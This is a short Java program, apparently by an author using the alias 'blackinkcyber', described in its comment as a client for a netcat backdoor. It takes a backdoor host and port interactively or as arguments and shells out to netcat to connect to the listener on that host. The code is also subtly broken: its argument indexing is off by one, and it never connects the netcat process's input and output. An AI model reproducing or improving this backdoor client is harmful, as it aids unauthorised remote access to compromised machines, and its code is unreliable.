// package com.company.demo;
import java.io.IOException;
import java.util.Scanner;

/**
 * @author Alias
 *          ^^ AKA: blackinkcyber
 * This is a simple java client for the netcat backdoor. two modes, CLI argument or interactive.
 */
public class client {
    public static void main(String[] args) {
        try {
            if (args.length == 0) {
                Scanner user_input = new Scanner(System.in);
                System.out.print("IP to backdoor host: ");
                String host = user_input.nextLine();
                System.out.print("port of listener on backdoor host: ");
                int port = Integer.parseInt(user_input.nextLine());
                Runtime.getRuntime().exec("netcat " + host + " " + port);
            } else if (args.length == 1) {
                System.out.println("Arguments unsatisfied. run 'java <this file> <host> <port>' \n or execute the script" +
                        "without parameters to run in interactive mode.");
                System.exit(1);
            }else{
                Runtime.getRuntime().exec("netcat "+args[1]+" "+args[2]);
            }
        }catch (IOException io){
            io.printStackTrace();
        }
    }
}
